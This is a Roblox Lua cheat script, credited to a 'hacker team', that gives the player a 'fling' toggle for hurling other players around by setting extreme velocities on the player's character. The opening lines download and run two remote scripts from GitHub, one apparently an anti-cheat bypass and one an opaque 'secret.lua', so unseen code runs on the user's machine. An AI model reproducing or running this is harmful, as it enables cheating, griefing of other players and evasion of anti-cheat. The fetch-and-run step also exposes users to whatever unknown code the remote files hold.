print("Made by Triackers Hacker Team")
loadstring(game:HttpGet('https://raw.githubusercontent.com/FurkanSelimKucukaslan/a/main/secret.lua'))()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Pro666Pro/BypassAntiCheat/main/main.lua'))()
wait(2)
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false
ScreenGui.Name = "Triackers_FLING"

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderColor3 = Color3.fromRGB(0, 85, 0)
Frame.BorderSizePixel = 2
Frame.Position = UDim2.new(0.341826946, 0, 0.367763907, 0)
Frame.Size = UDim2.new(0, 148, 0, 106)
local uicorner = Instance.new("UICorner")
uicorner.Parent = Frame
uicorner.CornerRadius = UDim.new(0, 25)
local uistroke = Instance.new("UIStroke")
uistroke.Parent = Frame
uistroke.Color = Color3.fromRGB(0, 85, 0)
uistroke.Thickness = 5

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderColor3 = Color3.fromRGB(85, 0, 0)
TextButton.BorderSizePixel = 2
TextButton.Position = UDim2.new(0.0835492909, 0, 0.552504063, 0)
TextButton.Size = UDim2.new(0, 124, 0, 37)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "OFF"
TextButton.TextColor3 = Color3.fromRGB(85, 0, 0)
TextButton.TextSize = 41.000
local uicorner1 = Instance.new("UICorner")
uicorner1.Parent = TextButton
uicorner1.CornerRadius = UDim.new(0, 25)
local uistroke1 = Instance.new("UIStroke")
uistroke1.Parent = TextButton
uistroke1.Color = Color3.fromRGB(85, 0, 0)
uistroke1.Thickness = 2
uistroke1.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 85, 0)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0649713054, 0, 0.0727680102, 0)
TextLabel.Size = UDim2.new(0, 128, 0, 39)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Fling"
TextLabel.TextColor3 = Color3.fromRGB(0, 85, 0)
TextLabel.Font = Enum.Font.Merriweather
TextLabel.TextSize = 34.000


local x = Instance.new("TextButton")
x.Parent = Frame
x.Size = UDim2.new(0.121, 0,0.152, 0)
x.TextScaled = true
x.Text = "x"
x.BackgroundColor3 = Color3.new(0, 0, 0)
x.TextColor3 = Color3.fromRGB(255, 0, 0)
x.Position = UDim2.new(0.938, 0,0.915, 0)

local uicorner7 = Instance.new("UICorner")
uicorner7.Parent = x
uicorner7.CornerRadius = UDim.new(0, 25)

local uistroke7 = Instance.new("UIStroke")
uistroke7.Parent = x
uistroke7.Color = Color3.fromRGB(255, 0, 0)
uistroke7.Thickness = 2
uistroke7.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

-- Scripts:

local function CTIKC_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RunService = game:GetService("RunService")
	local Players = game:GetService("Players")

	local toggleButton = script.Parent
	local hiddenfling = false


	if not ReplicatedStorage:FindFirstChild("juisdfj0i32i0eidsuf0iok") then
		local detection = Instance.new("Decal")
		detection.Name = "juisdfj0i32i0eidsuf0iok"
		detection.Parent = ReplicatedStorage
	end

	local function fling()
		local hrp, c, vel, movel = nil, nil, nil, 0.1
		local lp = Players.LocalPlayer

		while true do
			RunService.Heartbeat:Wait()
			if hiddenfling then
				while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
					RunService.Heartbeat:Wait()
					c = lp.Character
					hrp = c and c:FindFirstChild("HumanoidRootPart")
				end

				if hiddenfling then
					vel = hrp.Velocity
					hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
					RunService.RenderStepped:Wait()
					if c and c.Parent and hrp and hrp.Parent then
						hrp.Velocity = vel
					end
					RunService.Stepped:Wait()
					if c and c.Parent and hrp and hrp.Parent then
						hrp.Velocity = vel + Vector3.new(0, movel, 0)
						movel = movel * -1
					end
				end
			end
		end
	end

	toggleButton.MouseButton1Click:Connect(function()
		hiddenfling = not hiddenfling
		if hiddenfling then
			uistroke1.Color = Color3.fromRGB(0, 85, 0)
			toggleButton.TextColor3 = Color3.fromRGB(0, 85, 0)
			toggleButton.Text = "ON"
		else
			uistroke1.Color = Color3.fromRGB(85, 0, 0)
			toggleButton.TextColor3 = Color3.fromRGB(85, 0, 0)
			toggleButton.Text = "OFF"
		end
	end)

	fling()

end
coroutine.wrap(CTIKC_fake_script)()
local function FFJFK_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	script.Parent.Active = true
	script.Parent.Draggable = true
end

x.MouseButton1Click:Connect(function()
	ScreenGui:Destroy()
end)

coroutine.wrap(FFJFK_fake_script)()
